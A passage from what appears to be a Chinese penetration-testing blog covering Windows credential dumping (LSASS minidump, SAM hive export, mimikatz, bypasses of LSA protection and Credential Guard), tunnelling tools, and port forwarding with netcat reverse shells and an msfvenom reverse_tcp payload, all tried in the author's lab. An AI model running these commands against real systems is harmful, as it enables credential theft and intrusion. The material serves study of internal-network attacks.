&quot;IMAGENAME eq lsass.exe&quot; .NH&#39;) do rundall32.exe C:\windows\System32\comsvcs.dll MiniDump %i .\lsass.dmp full</code></p><p> 报错。。。</p><h3 id="9-SAM数据库"><a href="#9-SAM数据库" class="headerlink" title="9.SAM数据库"></a>9.SAM数据库</h3><p>sam文件：是用来存储本地用户账号密码的文件的数据库<br>system文件：里面有对sam文件进行加密和加密的密钥</p><p><strong>原理</strong></p><p>读取<code>HKLM\SYSTEM</code>，获得<code>syskey</code>：</p><p>syskey的由来： 读取注册表项<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的键值<code>JD</code>、<code>Skew1</code>、<code>GBG</code>和<code>Data</code>中的内容，拼接成<code>syskey</code></p><p>syskey的作用：Syskey中的加密的是账号数据库，也就是位于<code>%SystemRoot%\system32\config</code>的SAM文件</p><p>简单的说，导出sam和system文件，利用mimikatz解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hiv</span><br><span class="line">reg save hklm\system system.hiv</span><br><span class="line">lsadump::sam /sam:sam.hiv /system:system.hiv</span><br></pre></td></tr></table></figure><h2 id="3-常见的服务密码抓取"><a href="#3-常见的服务密码抓取" class="headerlink" title="3.常见的服务密码抓取"></a>3.常见的服务密码抓取</h2><h4 id="1-Navicat"><a href="#1-Navicat" class="headerlink" title="1.Navicat"></a>1.Navicat</h4><p>工具地址：<a href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p><p>Navicat是由PremiumSoft CyberTech Ltd.为MySQL，MariaDB，Oracle，SQLite，PostgreSQL和Microsoft SQL Server生产的一系列图形数据库管理和开发软件。它具有类似Explorer的图形用户界面，并支持本地和远程数据库的多个数据库连接。它的设计旨在满足从数据库管理员和程序员到为客户提供服务并与合作伙伴共享信息的各种企业&#x2F;公司的各种受众的需求。</p><p>当选择保存密码后，navicat会将这些信息加密后保存在注册表中</p><p><img src="image-20210201022223153.png" alt="image-20210201022223153"></p><p>将工具集成到cs后，反弹一个会话</p><p><img src="image-20210201022600111.png" alt="image-20210201022600111"></p><p>执行之后，会自己抓取</p><p><img src="image-20210201022627585.png" alt="image-20210201022627585"></p><p>若目标未安装navicat，会提示</p><p><img src="image-20210201022644110.png" alt="image-20210201022644110"></p><h4 id="2-lazage抓取浏览器密码"><a href="#2-lazage抓取浏览器密码" class="headerlink" title="2.lazage抓取浏览器密码"></a>2.lazage抓取浏览器密码</h4><p>目标及执行：<code>lazagne.exe broswers</code> 会尝试抓取浏览器存储的密码，参考上面。</p><h4 id="3-sharpdecryptpwd"><a href="#3-sharpdecryptpwd" class="headerlink" title="3.sharpdecryptpwd"></a>3.sharpdecryptpwd</h4><p>可以抓取navicat、sql server management studio、X manager–&gt;xshell、xftp、 Teamview、Filezile、winscp的密码</p><h4 id="4-数据库密码抓取"><a href="#4-数据库密码抓取" class="headerlink" title="4.数据库密码抓取"></a>4.数据库密码抓取</h4><p>查看配置文件，端口转发连接到数据库</p><h2 id="4-密码抓取绕过（win10及2012版本之后）"><a href="#4-密码抓取绕过（win10及2012版本之后）" class="headerlink" title="4.密码抓取绕过（win10及2012版本之后）"></a>4.密码抓取绕过（win10及2012版本之后）</h2><h3 id="1-2012操作系统之后的绕过抓取"><a href="#1-2012操作系统之后的绕过抓取" class="headerlink" title="1.2012操作系统之后的绕过抓取"></a>1.2012操作系统之后的绕过抓取</h3><p>直接用mimikatz抓取的密码会显示null</p><p><img src="image-20210201005404128.png" alt="image-20210201005404128"></p><p>绕过方式</p><h4 id="1-操作注册表"><a href="#1-操作注册表" class="headerlink" title="1.操作注册表"></a>1.操作注册表</h4><h5 id="1-修改注册表键值"><a href="#1-修改注册表键值" class="headerlink" title="1.修改注册表键值"></a>1.修改注册表键值</h5><p>通过修改注册表，当键值&#x3D;1时，Wdigest Auth保存明文口令，为0则不保存明文，再次登录生效</p><p>执行以下命令修改·注册表键值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p>关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><img src="image-20210201010138632.png" alt="image-20210201010138632"></p><p>执行以下命令模拟用户锁屏：<code>rundll32.exe user32.dll,LockWorkStation</code></p><p>重新登陆以后在使用mimikatz进行抓取密码</p><p><img src="image-20210201010536492.png" alt="image-20210201010536492"></p><h5 id="2-保存注册表"><a href="#2-保存注册表" class="headerlink" title="2.保存注册表"></a>2.保存注册表</h5><p>使用注册表导出Hash，再通过impacket进行离线读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM sys.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save hklm\security security.hiv</span><br><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system sys.hiv LOCAL</span><br></pre></td></tr></table></figure><h4 id="2-绕过kb2871997"><a href="#2-绕过kb2871997" class="headerlink" title="2.绕过kb2871997"></a>2.绕过kb2871997</h4><p>这个补丁的作用是防止攻击者抓取明文密码，绕过方式如下。</p><p>脚本地址： <a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p><p>使用之前需要在c盘新建一个<code>test/pwd.txt</code>文件</p><p>执行以下命令会注销掉操作系统，让用户重新登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File dump.ps1</span><br></pre></td></tr></table></figure><p><img src="image-20210201013650065.png" alt="image-20210201013650065"></p><h4 id="3-protected-users"><a href="#3-protected-users" class="headerlink" title="3.protected users"></a>3.protected users</h4><p>受保护用户是一个新的域全局安全组，对于该组的成员，windows 8.1设备或Windows Server2012 R2主机不会缓存受保护用户不支持的凭据。如果这些组的成员登录到运行早于Windows8.1的Windows版本的设备，则该组的成员没有其他保护。登录到Windows 8.1设备和Windows Server 2012 R2主机的受保护用户组的成员不能再使用:</p><p>1.默认凭据委派(CredssP )-即使启用了”允许委派默认凭据”策略，也不会缓存纯文本凭据</p><p>2.windows摘要–即使启用明文凭掘也不会进行缓存</p><p>3.NTLM - NTOWF未媛存</p><p>4.Kerberos长期密钥-Kerberos票证授予票证(TGT)在登录时获取，无法自动重新获取</p><p>5.离线登录-未创建缓存的登录验证程序</p><p>如果域功能级别是Windows Server 2012 R2，则该组的成员不能再:</p><p>1.使用NTLM身份验证进行身份验证</p><p>2.在Kerberos预身份验证中使用数掘加密标准(DES )或RC4密码套件。</p><p>3.通过使用无约束或约束委派来委派</p><p>4.更新用户票证(TGT)超过最初的4小时生命周期</p><p><img src="image-20210201014317852.png" alt="image-20210201014317852"></p><p>如果此时直接使用mimikatz的<code>SEKURLSA::LogonPasswords</code>抓取会出现乱码</p><p>绕过方式：使用：<code>sekurlsa::ekeys</code></p><p><img src="image-20210201015323031.png" alt="image-20210201015323031"></p><h4 id="4-Additional-LSA-Protection"><a href="#4-Additional-LSA-Protection" class="headerlink" title="4.Additional LSA Protection"></a>4.Additional LSA Protection</h4><p>LSA(包括本地安全机构服务器服务(LSASS )进程）验证用户是否进行本地和远程登录，并实施本地安全策略。Windows 8.1操作系统为LSA提供额外保护，以防止未受保护的进程读取内存和代码注入。启用此功能后无法把debugger attach到进程上。在win8.1及2012 r2以上有效。</p><p><strong>启用lsa</strong></p><p>注册表位置：</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</p><p><img src="image-20210201020736802.png" alt="image-20210201020736802"></p><p>新建-DWORD（32）值，名称为 RunAsPPL,数值为 00000001，重启系统生效。</p><p><img src="image-20210201020807752.png" alt="image-20210201020807752"></p><p>在配置了lsa后，执行<code>misc::skeleton</code>会报错</p><p><img src="image-20210201020921648.png" alt="image-20210201020921648"></p><p><strong>绕过</strong></p><p>mimikatz首先加载驱动：<code>!+</code></p><p><img src="image-20210201020048564.png" alt="image-20210201020048564"></p><p>然后先执行：<code>!processprotect /process:lsass.exe /remove</code></p><p><img src="image-20210201020344130.png" alt="image-20210201020344130"></p><p>验证<code>misc::skeleton</code>（可省略）</p><p><img src="image-20210201021117290.png" alt="image-20210201021117290"></p><p>再使用<code>SEKURLSA::LogonPasswords</code>抓取明文密码</p><p><img src="image-20210201020413865.png" alt="image-20210201020413865"></p><h4 id="5-Credentials-Guard"><a href="#5-Credentials-Guard" class="headerlink" title="5.Credentials Guard"></a>5.Credentials Guard</h4><p>credentials Guard是win10中引入的新功能，据称能保护NTLM密码哈希值，Kerberos票证授予票证和应用程序存储的凭据。该进程是唯一能使用明文凭据的进程，它的原理大概是这样:当NTLM认证过程中需要用到例如ntlm hash这类凭证的时候（第三步)，将Credentials Guard视为黑箱，由lsass等进程输入生成NetNTLM所需的信息（第二步收到的challenge等等)，由CG处理并输出结果，而CG本身内存禁止读取，使得mimikatz这一类工具无从下手:</p><p><img src="image-20210201021304852.png" alt="image-20210201021304852"></p><p><strong>绕过方式</strong></p><p>memssp SSP的二进制形式是DLL，提供用来处理身份认证的接口(SSPI)。如果我们无法从内存中直接获取凭据，那么通过注册一个ssp来处理用户登录时输入的凭据也是一种办法。mimikatz直接在内存中加栽自定义的ssp dll，能够在用户登录时获取到明文凭据.</p><p>mimikatz内存注入sSp</p><p><img src="image-20210201021702029.png" alt="image-20210201021702029"></p><p>等待用户再次登录。登录后可以在<code>c:/windows/system32/mimilsa.log</code>下查看明文密码</p><p><img src="image-20210201022028114.png" alt="image-20210201022028114"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rundll32 </tag>
            
            <tag> 加载mimikatz的10种姿势 </tag>
            
            <tag> QuarksPwDump </tag>
            
            <tag> wce </tag>
            
            <tag> pwdump7 </tag>
            
            <tag> LaZagne </tag>
            
            <tag> sharpdump </tag>
            
            <tag> procdump </tag>
            
            <tag> sqldumper </tag>
            
            <tag> SAM数据库 </tag>
            
            <tag> Navicat </tag>
            
            <tag> sharpdecryptpwd </tag>
            
            <tag> 数据库密码抓取 </tag>
            
            <tag> win10及2012之后密码抓取绕过五种姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络代理</title>
      <link href="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
      <url>/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>本文介绍4种常见的网络协议代理以及进行代理的常用工具。</p><span id="more"></span><p>代理相当于将内网撕开一个口子将攻击机放进内网。</p><p>攻击机：kali：192.168.43.30</p><p>客户机：win7：192.168.43.78</p><p>客户机1：win2k8：192.168.43.127</p><h2 id="1-socks代理"><a href="#1-socks代理" class="headerlink" title="1.socks代理"></a>1.socks代理</h2><h3 id="1-cs"><a href="#1-cs" class="headerlink" title="1.cs"></a>1.cs</h3><p><img src="image-20210130234119079.png" alt="image-20210130234119079"></p><p>选择监听端口</p><p><img src="image-20210130234136948.png" alt="image-20210130234136948"></p><h3 id="2-msf"><a href="#2-msf" class="headerlink" title="2.msf"></a>2.msf</h3><p>msf生成攻击载荷在客户机，开启监听得到一个session，然后使用<code>run post/multi/manage/autoroute</code>模块在客户机和攻击机之间添加一个路由</p><p><img src="image-20210131004437697.png" alt="image-20210131004437697"></p><p><code>run autoroute -p</code>查看路由</p><p><img src="image-20210131004506634.png" alt="image-20210131004506634"></p><p><code> use  auxiliary/server/socks_proxy</code>开启socks代理</p><p><img src="image-20210131005020117.png" alt="image-20210131005020117"></p><p>exploit执行，jobs查看任务</p><p><img src="image-20210131005045576.png" alt="image-20210131005045576"></p><p>此socks相当于一个vpn需要自己连接才能使用，此时需要借助proxychains代理链来调用socks代理</p><p>编辑代理链的文件&#x2F;etc&#x2F;proxychains.conf设置代理，设置socks</p><p><img src="image-20210131005345851.png" alt="image-20210131005345851"></p><p>此时使用proxychains连接客户机所在内网的任何一台机器都OK</p><h3 id="3-ew"><a href="#3-ew" class="headerlink" title="3.ew"></a>3.ew</h3><h4 id="1-正向代理"><a href="#1-正向代理" class="headerlink" title="1.正向代理"></a>1.正向代理</h4><p>在客户机1上开启socks服务监听指定端口：<code>ew_win32.exe -s ssocksd -l 1080</code> （-s：指定协议，-l:指定端口）</p><p><img src="image-20210205163217525.png" alt="image-20210205163217525"></p><p>由于攻击机和客户机IP不一样，所以需要改变攻击机代理链配置文件</p><p><img src="image-20210205164144197.png" alt="image-20210205164144197"></p><p>连接客户机1即可：<code>proxychains rdesktop 192.168.43.127</code></p><p><img src="image-20210205163455839.png" alt="image-20210205163455839"></p><p>本次实验win7也能成功。</p><h4 id="2-反向代理"><a href="#2-反向代理" class="headerlink" title="2.反向代理"></a>2.反向代理</h4><p>在客户机开启一个socks代理，把本地的流量从port1转发到port2端口：<code>ew_win32.exe -s rcsocks -l port1 -e port2</code></p><p><img src="image-20210205170622445.png" alt="image-20210205170622445"></p><p>在客户机1开启一个socks代理把本地的流量转发到客户机的port2上：<code>ew_win32.exe -s rssocks -d host1 -e port2</code></p><p><img src="image-20210205170632277.png" alt="image-20210205170632277"></p><p>编辑代理链的文件&#x2F;etc&#x2F;proxychains.conf设置代理，设置socks为客户机</p><p><img src="image-20210205170718271.png" alt="image-20210205170718271"></p><p>连接客户机1即可</p><p><img src="image-20210205170757366.png" alt="image-20210205170757366"></p><p>流量走向</p><p>攻击机&lt;—&gt;客户机1:port&lt;—&gt;客户机1:port2&lt;—&gt;客户机2</p><h3 id="4-termite"><a href="#4-termite" class="headerlink" title="4.termite"></a>4.termite</h3><p>客户端监听端口：<code>agent_win32.exe -l port</code></p><p><img src="image-20210131012439648.png" alt="image-20210131012439648"></p><p>服务端连接到客户端即可：<code>./admin_linux_i586 -c 客户端ip -p 客户端port</code></p><p><img src="image-20210131012515965.png" alt="image-20210131012515965"></p><p>根据提示选择对应的功能即可，但是在使用socks时候要编辑代理链为本地</p><p>本次只测试了win7，没有测试win2k8</p><h2 id="2-dns协议"><a href="#2-dns协议" class="headerlink" title="2.dns协议"></a>2.dns协议</h2><h3 id="1-dnscat"><a href="#1-dnscat" class="headerlink" title="1.dnscat"></a>1.dnscat</h3><p>1.dnscat2</p><p>这里由于我新版的机器安装ruby很麻烦，所以把以前的贴图放出来（kali，win2k8）</p><p>分为客户端和服务端，但是客户端只支持Windows</p><p>服务端建立监听(服务端需要ruby环境)：<code>ruby dnscat2.rb --dns &quot;domain=pentestlab, host=lhost&quot; --no-cache</code></p><p><img src="image-20210205172526702.png" alt="image-20210205172526702"></p><p>客户端连接到服务端：<code>dnscat2-v0.07-client-win32.exe --dns server=服务端ip</code></p><p><img src="image-20210205172537723.png" alt="image-20210205172537723"></p><p>连接成功</p><p><img src="image-20210205172610917.png" alt="image-20210205172610917"></p><p>可以执行的命令</p><p><img src="image-20210205172622495.png" alt="image-20210205172622495"></p><p>查看会话信息：windows</p><p><img src="image-20210205172632718.png" alt="image-20210205172632718"></p><p>与会话进行交互：session -i id</p><p><img src="image-20210205172641743.png" alt="image-20210205172641743"></p><p>进行交互之后可以执行的命令</p><p><img src="image-20210205172650493.png" alt="image-20210205172650493"></p><p><strong>如何得到windows的cmd？</strong></p><p>执行shell，创建一个新的会话信息</p><p><img src="image-20210205172713447.png" alt="image-20210205172713447"></p><p>返回主界面查看cmd会话建立</p><p><img src="image-20210205172722855.png" alt="image-20210205172722855"></p><p>进入cmd交互</p><p><img src="image-20210205172730585.png" alt="image-20210205172730585"></p><h3 id="2-iodine（速度快，不支持win10）"><a href="#2-iodine（速度快，不支持win10）" class="headerlink" title="2.iodine（速度快，不支持win10）"></a>2.iodine（速度快，不支持win10）</h3><p>iodine基于C语言开发，分为服务端程序iodined和客户端程序 iodine，kali系统已内置。支持EDNS、base32，base64，base128等多种编码规范</p><p>攻击机执行：<code>iodined -p 1234 -f -DD 192.168.43.30 abc.com</code></p><p>客户机执行：<code>iodine -p 1234 -f -r -T TXT 192.168.43.30 abc.com</code></p><p>我没复现出来。。。</p><h2 id="3-http协议"><a href="#3-http协议" class="headerlink" title="3.http协议"></a>3.http协议</h2><p>这一个板块，由于我没有配环境，直接将之前的拿出来了。。。。</p><h3 id="1-reduh（对aspx好一丢丢）"><a href="#1-reduh（对aspx好一丢丢）" class="headerlink" title="1.reduh（对aspx好一丢丢）"></a>1.reduh（对aspx好一丢丢）</h3><p>支持aspx、jsp、php(php不稳定，以下为jsp环境测试)</p><p>把webshell上传至客户端，访问以后成功出现以下情况</p><p><img src="image-20210205175857271.png" alt="image-20210205175857271"></p><p>服务端连接，（服务端是Java环境）：<code>java -jar reDuhClient.jar webshell地址</code></p><p><img src="image-20210205175849425.png" alt="image-20210205175849425"></p><p>连接成功会监听本地的1010端口，使用nc连接即可：<code>nc -vv localhost 1010</code></p><p><img src="image-20210205175907641.png" alt="image-20210205175907641"></p><p>但是只能进行端口转功能，将目标转发至本地：<code>[createTunnel]lport:127.0.0.1:rport</code></p><p><img src="image-20210205175927785.png" alt="image-20210205175927785"></p><p>但是连接后不稳定会断开</p><p><img src="image-20210205175937357.png" alt="image-20210205175937357"></p><h3 id="2-tunna（对aspx好一点）"><a href="#2-tunna（对aspx好一点）" class="headerlink" title="2.tunna（对aspx好一点）"></a>2.tunna（对aspx好一点）</h3><p>支持aspx、jsp、php</p><p>将webshell传至客户机后访问成功出现以下情况</p><p><img src="image-20210205180009697.png" alt="image-20210205180009697"></p><p>服务端执行：<code>pyhon proxy.py -u webshell地址 -l 4444 -r 3389 -s -v --no-socks</code></p><p><img src="image-20210205180028394.png" alt="image-20210205180028394"></p><p>直接报错。。。</p><h3 id="3-regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）"><a href="#3-regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）" class="headerlink" title="3.regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）"></a>3.regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）</h3><p>支持jsp、aspx、php、ashx</p><p>将webshell上传至客户端成功后访问显示</p><p><img src="image-20210205180039563.png" alt="image-20210205180039563"></p><p>服务端在本地指定端口上开启一个socks服务：<code>python reGeorgSocksProxy.py -p port -u webshell地址</code></p><p><img src="image-20210205180047311.png" alt="image-20210205180047311"></p><p>设置本地的代理链为指定的端口</p><p><img src="image-20210205180100801.png" alt="image-20210205180100801"></p><p>连接即可</p><p><img src="image-20210205180110603.png" alt="image-20210205180110603"></p><p>但是http比较慢</p><h3 id="4-neo-regeorg"><a href="#4-neo-regeorg" class="headerlink" title="4.neo-regeorg"></a>4.neo-regeorg</h3><p>支持加密</p><p>服务端使用参数k指定密码，成功后会在相应文件夹下生成对应的webshell:<code>python neoreg.py generate -k 密码</code></p><p><img src="image-20210205180155972.png" alt="image-20210205180155972"></p><p>使用同reGeorg类似</p><h2 id="4-icmp协议"><a href="#4-icmp协议" class="headerlink" title="4.icmp协议"></a>4.icmp协议</h2><h3 id="1-icmpsh"><a href="#1-icmpsh" class="headerlink" title="1.icmpsh"></a>1.icmpsh</h3><p>执行前在服务端执行：<code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p><p>然后服务端继续执行：<code>python icmpsh_m.py lhost rhost</code></p><p><img src="image-20210205153640852.png" alt="image-20210205153640852"></p><p>执行完后不会有什么反应，在客户端使用参数t连接服务端：<code>icmpsh.exe -t rhost</code></p><p><img src="image-20210205153625385.png" alt="image-20210205153625385"></p><p>成功后服务端得到一个shell</p><p><img src="image-20210205153604374.png" alt="image-20210205153604374"></p><p>本次实验在win2008上进行的，因为win7连接失败了，连接后一直接收不到。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cs </tag>
            
            <tag> msf </tag>
            
            <tag> ew </tag>
            
            <tag> termite </tag>
            
            <tag> dnscat </tag>
            
            <tag> iodine </tag>
            
            <tag> reduh </tag>
            
            <tag> tunna </tag>
            
            <tag> regeorg </tag>
            
            <tag> neo-regeorg </tag>
            
            <tag> icmpsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口转发</title>
      <link href="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p>本文介绍一些端口转发的常用工具</p><span id="more"></span><p>攻击机：kali  192.168.43.30</p><p>客户机：win7 192.168.43.78</p><p>客户机1：win2k8 192.168.43.127</p><p>反向连接：此时外网无法访问内网，内网可以访问外网，就让内网机器主动连接外网攻击机</p><p>正向连接：此时内网无法访问外网，外网可以访问内网，此方式流量比较大，但是防火墙需关闭</p><h2 id="1-nc"><a href="#1-nc" class="headerlink" title="1.nc"></a>1.nc</h2><h3 id="1-反向连接"><a href="#1-反向连接" class="headerlink" title="1.反向连接"></a>1.反向连接</h3><p>攻击机监听本地端口：<code>nc -lnvp lport</code></p><p><img src="image-20210129213508026.png" alt="image-20210129213508026"></p><p>客户机反向连接攻击机：<code>nc.exe -e cmd rhost rport</code></p><p><img src="image-20210129215518607.png" alt="image-20210129215518607"></p><p>攻击机获得客户机的cmdshell</p><p><img src="image-20210129215531327.png" alt="image-20210129215531327"></p><h3 id="2-正向连接"><a href="#2-正向连接" class="headerlink" title="2.正向连接"></a>2.正向连接</h3><p>客户机开启监听：<code>nc.exe -l -p lport -e cmd.exe</code></p><p><img src="image-20210129215811482.png" alt="image-20210129215811482"></p><p>攻击机主动连接客户机：<code>nc -nvv rhost rport</code>即可获得客户机的cmdshell</p><p><img src="image-20210129215749829.png" alt="image-20210129215749829"></p><h2 id="2-lcx"><a href="#2-lcx" class="headerlink" title="2.lcx"></a>2.lcx</h2><h3 id="1-反向连接-1"><a href="#1-反向连接-1" class="headerlink" title="1.反向连接"></a>1.反向连接</h3><p>客户机把本地端口转发到远程端口：<code> lcx.exe -slave rhost rport lhost lport</code>（连接3389，需要开启此端口）</p><p><img src="image-20210129224151267.png" alt="image-20210129224151267"></p><p>攻击机用portmap（相当于Linux的lcx）将本地的端口转发至另外一个端口 ：<code>portmap -m 2 -p1 port -p2 port</code></p><p><img src="image-20210129221530534.png" alt="image-20210129221530534"></p><p>此时攻击机连接本地的5555端口（第一次连接时可能会确认）</p><p><img src="image-20210129224302638.png" alt="image-20210129224302638"></p><p>但是会把客户机挤掉线。。。</p><h3 id="2-正向连接-1"><a href="#2-正向连接-1" class="headerlink" title="2.正向连接"></a>2.正向连接</h3><p>可以访问外网的内网客户机将端口转发到另一台无法访问外网的内网客户机1的端口上：<code>lcx.exe -tran lport rhost rport</code></p><p><img src="image-20210129233221324.png" alt="image-20210129233221324"></p><p>攻击机连接访问外网的内网客户机的端口（此时就连接上了客户机1）</p><p><img src="image-20210129233406109.png" alt="image-20210129233406109"></p><h3 id="3-绕过防火墙"><a href="#3-绕过防火墙" class="headerlink" title="3.绕过防火墙"></a>3.绕过防火墙</h3><p>客户机将防火前监视的端口转发到防火墙监控不严的端口：<code>lcx.exe -tran 监控不严的窗口 lhost 监控严格的窗口</code></p><p><img src="image-20210129233956914.png" alt="image-20210129233956914"></p><p>此时攻击机连接客户机</p><p><img src="image-20210129234042891.png" alt="image-20210129234042891"></p><h2 id="3-netsh"><a href="#3-netsh" class="headerlink" title="3.netsh"></a>3.netsh</h2><p>Windows自带的防火墙规则配置工具。不同的操作系统版本中规则不一样。大概可以用来将本机端口转发至本机或者其他机器。</p><p><code>netsh firewall show state</code> 查看系统防火墙状态</p><p><code>netsh firewall set opmode disable</code> 关闭防火墙</p><p><code>netsh firewall set opmode enable</code> 开启防火墙</p><p>添加转发规则：<code>netsh interface portproxy add v4tov4 listenport=本地TCP端口 listenaddress=本地IP connectport=将传入连接重定向到本地或远程的端口 connectaddress=将传入连接重定向到本地或远程IP地址（或DNS名称）</code></p><p>查看转发规则：<code>netsh interface portproxy dump</code></p><p>显示系统中的转发规则列表：<code>netsh interface portproxy show all</code></p><p>删除转发规则：<code>netsh interface portproxy delete v4tov4 listenport=本机端口  listenaddress=本地ip</code></p><p>清除所有当前的端口转发规则：<code>netsh interface portproxy reset</code></p><h2 id="4-htran"><a href="#4-htran" class="headerlink" title="4.htran"></a>4.htran</h2><h3 id="1-绕过防火墙"><a href="#1-绕过防火墙" class="headerlink" title="1.绕过防火墙"></a>1.绕过防火墙</h3><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1.正向连接"></a>1.正向连接</h4><p>客户机执行<code>htran.exe -p -tran 允许出网的端口(dns:53 http:80) 127.0.0.1 被禁出网的端口</code></p><p><img src="image-20210130005546295.png" alt="image-20210130005546295"></p><p>攻击机监听即可</p><p><img src="image-20210130005611826.png" alt="image-20210130005611826"></p><h4 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2.反向连接"></a>2.反向连接</h4><p>客户机将本地的端口转发到攻击机端口<code>htran.exe -p -slave rhost rport 127.0.0.1 lport </code></p><p><img src="image-20210130010234940.png" alt="image-20210130010234940"></p><p>攻击机利用portmap进行转发</p><p><img src="image-20210130010211109.png" alt="image-20210130010211109"></p><p>攻击机监听即可</p><p><img src="image-20210130010137130.png" alt="image-20210130010137130"></p><h3 id="2-转发内网端口"><a href="#2-转发内网端口" class="headerlink" title="2.转发内网端口"></a>2.转发内网端口</h3><p>1.将客户机转发到本地<code>Htran.exe -p -tran lport1 lhost lport2</code></p><p><img src="image-20210130011414066.png" alt="image-20210130011414066"></p><p>攻击机监听客户机即可</p><p><img src="image-20210130011451711.png" alt="image-20210130011451711"></p><p>2.此方法内网中被攻击的主机均需具有此工具</p><p>客户机监听本地端口（相当于将端口1转发至端口2） <code>htran.exe -p listen lport1 lport2</code></p><p><img src="image-20210130011956041.png" alt="image-20210130011956041"></p><p>客户机1将本地的端口转发至客户机的端口1:<code> htran.exe -p -slave host1 port1 127.0.0.1 lport</code></p><p><img src="image-20210130012149883.png" alt="image-20210130012149883"></p><p>攻击机监听客户机的端口2即可（最后链接的是客户机1）<code>rdesktop 192.168.43.78：9999 </code></p><p>不知道什么原因，本地没有复现出来、。。。</p><h2 id="5-socat"><a href="#5-socat" class="headerlink" title="5.socat"></a>5.socat</h2><p>使用TCP4监听客户机本地端口，将客户机1的端口转发到本地：<code>socat.exe TCP4-LISTEN:lport,reuseaddr,fork TCP4:rhost:rport</code></p><p><img src="image-20210130014200104.png" alt="image-20210130014200104"></p><p>攻击机监听客户机即可（最后是监听的客户机1）</p><p><img src="image-20210130014306327.png" alt="image-20210130014306327"></p><h2 id="6-fpipe"><a href="#6-fpipe" class="headerlink" title="6.fpipe"></a>6.fpipe</h2><p>将客户机1转发到客户机:<code>Fpipe.exe -l lport -r rport rhost -v （v:显示过程）</code></p><p><img src="image-20210130014516518.png" alt="image-20210130014516518"></p><p>攻击机连接客户机即可（最后链接的是客户机2）</p><p><img src="image-20210130014555714.png" alt="image-20210130014555714"></p><h2 id="7-portfwd"><a href="#7-portfwd" class="headerlink" title="7.portfwd"></a>7.portfwd</h2><p> msf生成一个木马放入客户机进行执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.30 lport=3333 -f exe &gt; bug.exe</span><br></pre></td></tr></table></figure><p>攻击机开启监听.</p><p><img src="image-20210130015102500.png" alt="image-20210130015102500"></p><p>将客户机1转发到本地（此时本地是客户机：<code>portfwd add -l port -r rhost -p rport</code></p><p><img src="image-20210130015238123.png" alt="image-20210130015238123"></p><p>查看转发规则：<code>portfwd list</code></p><p>监听客户机即可（最后链接的是客户机1）</p><p><img src="image-20210130015600557.png" alt="image-20210130015600557"></p><h2 id="8-cs"><a href="#8-cs" class="headerlink" title="8.cs"></a>8.cs</h2><p>使用cs生成一个木马并放置客户机运行，成功上线，然后后msf一样在交互区输入：<code>port lport rhost rport</code></p><p>停止转发：<code>rprtfwd stop 8888</code></p><h2 id="9-rinetd（linux自带文件-etc-rinetd-conf）"><a href="#9-rinetd（linux自带文件-etc-rinetd-conf）" class="headerlink" title="9.rinetd（linux自带文件 &#x2F;etc&#x2F;rinetd.conf）"></a>9.rinetd（linux自带文件 &#x2F;etc&#x2F;rinetd.conf）</h2><p><a href="https://github.com/boutell/rinetd">https://github.com/boutell/rinetd</a></p><p>按如下格式编辑此文件，将远程客户机转发到本地攻击机：<code>0.0.0.0 lport rhost rport</code></p><p><img src="image-20210130020222684.png" alt="image-20210130020222684"></p><p>启动rinetd：<code>rinetd</code></p><p>监听本机即可（最后连接的是客户机）</p><p>我失败了，没转发出来，，，法克</p><h2 id="10-rtcp"><a href="#10-rtcp" class="headerlink" title="10.rtcp"></a>10.rtcp</h2><p>需要python环境。github项目地址：<a href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a></p><p>在客户机运行：<code>./rtcp.py c:localhost:port c:rhost:port1</code></p><p><img 